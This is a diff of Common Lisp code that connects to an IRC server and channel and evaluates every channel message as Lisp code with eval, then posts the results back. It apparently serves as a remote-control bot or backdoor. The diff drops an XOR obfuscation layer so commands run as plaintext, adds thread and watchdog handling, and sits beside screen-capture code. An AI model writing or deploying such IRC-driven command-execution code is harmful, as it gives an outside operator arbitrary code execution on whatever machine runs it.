@@ -163,36 +163,16 @@
 ;;  (make-bit-image
 ;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
 
-(defparameter *irc-sess* (get-universal-time))
-(defparameter *irc-user* (format nil "b~A" *irc-sess*))
+(defparameter *irc-sess* nil) ;; (get-universal-time)
+(defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
 (defparameter *irc-serv* "irc.freenode.org")
 (defparameter *irc-chan* "#nvrtlessfndout")
 (defparameter *irc-lock* (bt:make-lock "irc-lock"))
 (defparameter *irc-conn* nil)
+(defparameter *irc-lock* (bt:make-lock "irc-lock"))
 
-(defun irc ()
-  "irc thread func"
-  (setf *irc-conn*
-        (handler-case
-            (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
-          (USOCKET:NS-TRY-AGAIN-CONDITION () nil)))
-  (when *irc-conn*
-    (dbg "~%::irc conn:~A" *irc-conn*))
-  (sleep 40))
-(defun irc-loop ()
-  (cl-irc:read-message-loop *irc-conn*))
-
-(defparameter *irc-thread*
-  (bt:make-thread (lambda ()
-                    (irc-loop))
-                  :name "irc-thread"
-                  :initial-bindings
-                  `((*standard-output* . ,*standard-output*)
-                    (*irc-user* . ,*irc-user*)
-                    (*irc-serv* . ,*irc-serv*)
-                    (*irc-chan* . ,*irc-chan*)
-                    (*irc-conn* . ,*irc-conn*))))
 ;; irc_cmd_proc
+;; seq_xor
 (defun seq-xor (len seq-1 seq-2)
   (let ((result (make-array len :element-type '(unsigned-byte 8))))
     (do ((idx 0 (incf idx)))
@@ -201,21 +181,21 @@
             (logxor (aref seq-1 idx)
                     (aref seq-2 idx))))
     result))
-
+;; ecrypt
 (defun encrypt (oct seed)
   (let* ((len (length oct))
          (gen (prbs:byte-gen 31 :seed seed))
          (gam (funcall gen len))
          (enc (seq-xor len oct gam)))
     (base64:usb8-array-to-base64-string enc)))
-
+;; decrypt
 (defun decrypt (base64 seed)
   (let* ((oct (base64:base64-string-to-usb8-array base64))
          (gen (prbs:byte-gen 31 :seed seed))
          (len (length oct))
          (gam (funcall gen len)))
     (seq-xor len oct gam)))
-
+;; bprint
 (defmacro bprint (var)
   `(subseq (with-output-to-string (*standard-output*)
              (pprint ,var)) 1))
@@ -224,20 +204,29 @@
   (lambda (param)
     (block irc-cmd-block
       (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
-             (src  (CL-IRC:SOURCE param))
-             (oct  (decrypt msg *irc-sess*))
-             (str  (handler-case
-                       (flex:octets-to-string oct :external-format :utf-8)
-                     (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil))))
-        (format t "~%::COMMAND::~A::" msg)
-        (format t "~%::SOURCE::~A::" src)
-        (format t "~%::str::~A::" str)
+             ;; (oct  (decrypt msg *irc-sess*))
+             ;; (str  (handler-case
+             ;;           (flex:octets-to-string oct :external-format :utf-8)
+             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
+             (str msg)
+             )
+        (dbg "::COMMAND: [~A]~%" msg)
+        (dbg "::EVAL [~A]~%" str)
+        (finish-output)
+        (setf *watchdog-timer* 0)
         (let ((result (handler-case (bprint (eval (read-from-string  str)))
-                        (TYPE-ERROR () (return-from irc-cmd-block nil)))))
+                        (t (err)
+                          (dbg "::irc-cmd error: ~A~%" (type-of err))
+                          (bt:with-lock-held (*irc-lock*)
+                            (cl-irc:privmsg
+                             *irc-conn* *irc-chan*
+                             (format nil "ERR: [~A]" (type-of err))))
+                          (return-from irc-cmd-block nil)))))
+          (setf *watchdog-timer* 0)
           (bt:with-lock-held (*irc-lock*)
             (cl-irc:privmsg *irc-conn* *irc-chan*
                             (format nil "=> ~A" result)))
-          (format t "~%::eval::~A::" result)
+          (dbg "::=> ~A~%" result)
           (finish-output))))))
 
 ;; (encrypt
@@ -267,8 +256,11 @@
 (defun irc-msg-hook (param)
   "MUST return T for stop hooks processing"
   (funcall *irc-cmd* param)
+  (setf *watchdog-timer* 0)
   t)
-(defun irc-join ()
+
+(defun irc-helper ()
+  (sleep 1)
   (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
   (sleep 1)
   (bt:with-lock-held (*irc-lock*)
@@ -277,9 +269,44 @@
   (bt:with-lock-held (*irc-lock*)
     (cl-irc:privmsg
      *irc-conn* *irc-chan*
-     (format nil "nfo:start"))))
+     (format nil "hi"))))
 
-(irc-join)
+(defun irc-loop ()
+  (bt:make-thread
+   #'irc-helper :name "irc-helper-th"
+   :initial-bindings
+   `((*standard-output* . ,*standard-output*)
+     (*irc-sess* . ,*irc-sess*)
+     (*irc-user* . ,*irc-user*)
+     (*irc-serv* . ,*irc-serv*)
+     (*irc-chan* . ,*irc-chan*)
+     (*irc-lock* . ,*irc-lock*)
+     (*irc-conn* . ,*irc-conn*)
+     (*irc-lock* . ,*irc-lock*)))
+  (handler-case (cl-irc:read-message-loop *irc-conn*)
+    (SB-INT:SIMPLE-STREAM-ERROR (err)
+      (dbg "::irc-loop error: ~A~%" (type-of err)))
+    ;; (t (err)
+    ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
+    ))
+
+(defun irc ()
+  "irc thread func"
+  (setf *irc-sess* (get-universal-time))
+  (setf *irc-user* (format nil "b~A" *irc-sess*))
+  (setf *irc-conn*
+        (handler-case
+            (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
+          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
+            (dbg "::irc connect error: ~A~%" (type-of err))
+            nil)
+          (t (err)
+            (dbg "::irc connect error: ~A~%" (type-of err))
+            nil)))
+  (when *irc-conn*
+    (dbg "::irc conn:~A~%" *irc-conn*)
+    (setf *watchdog-timer* 0)
+    (irc-loop)))
 (defmacro with-display (host (display screen root-window) &body body)
   `(let* ((,display (xlib:open-display ,host))
           (,screen (first (xlib:display-roots ,display)))
